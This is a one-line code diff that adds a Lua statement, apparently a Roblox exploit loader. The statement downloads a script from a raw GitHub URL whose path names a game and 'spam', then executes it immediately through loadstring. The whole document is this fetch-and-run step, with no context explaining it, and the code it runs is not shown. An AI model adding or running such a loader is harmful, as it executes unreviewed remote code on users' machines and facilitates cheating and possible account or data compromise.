@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/shogun-s-reign-spam5-9vaxp2wpou93je.lua"))()
